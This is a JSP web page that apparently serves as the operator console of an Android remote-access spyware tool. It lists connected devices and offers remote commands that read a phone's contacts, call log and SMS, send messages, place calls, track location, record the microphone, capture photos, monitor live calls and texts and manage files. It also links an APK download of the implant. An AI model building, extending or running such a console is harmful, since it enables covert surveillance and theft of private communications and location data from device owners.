<%--@elvariable id="devices" type="java.lang.String"--%>
<%--@elvariable id="clientId" type="java.lang.String"--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Client</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

    <link rel="stylesheet"
          href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <!--integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7"
    crossorigin="anonymous"-->
    <link rel="stylesheet" href="css/style.css"/>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js">
            /*integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS"
             crossorigin="anonymous">*/
    </script>
    <script src="js/webSocket.js"></script>
    <script> connectWs('${clientId}'); </script>
    <script src="js/myJs.js"></script>
</head>

<body>

    <noscript>
        <style type="text/css">
            body {background: #FFFFFF;}
            ul {display:none;}
            div {display:none;}
            p {margin: 2%; font-size: x-large;}
        </style>
        <p>
            JavaScript is disabled. For this site to work correctly, it is necessary to enable JavaScript.<br/>
            Here are the <a href="http://www.enable-javascript.com/" target="_blank">
            instructions how to enable JavaScript in your web browser</a>.
        </p>
    </noscript>

    <ul>
        <script> createList( '${devices}' ); </script>
    </ul>

    <div id="content">
        <form name="command_form" onsubmit="send()">
            <select id="commands" onchange="addArgument(this, this.options[this.selectedIndex].value)" title="select command">
                <option value="" style="display: none" selected disabled>Select a command</option>
                <option value="MakeToast">Make a toast</option>
                <option value="GetContacts">Get all contacts</option>
                <option value="GetCallLog">Get call log</option>
                <option value="GetSMS">Get all SMS messages</option>
                <option value="SendSMS">Send a SMS message</option>
                <option value="MakeCall">Make a call</option>
                <option value="GetLocation">Get device location</option>
                <option value="GetDeviceInfo">Get device info</option>
                <option value="OpenURL">Open website</option>
                <option value="RecordAudio">Record audio from mic</option>
                <option value="LiveCalls">See live calls</option>
                <option value="LiveSMS">See live SMS</option>
                <option value="ClickPhoto">Click a photo</option>
                <!--<option value="CaptureScreen">Take a screenshot</option>-->
                <option value="FileManager">Manage files</option>
            </select>
            <button type="button" onclick="send()">execute</button>
        </form>
        <div id="buttons">
            <a class="button btn btn-default" target="_blank" href="download?fileType=apk">get apk</a>
            <a class="button btn btn-default" onclick="update();" href="#">change<br/>password</a>
            <a class="button btn btn-default" onclick="wsClient.close();" href="logout">logout</a>
        </div>
    </div>

</body>
</html>
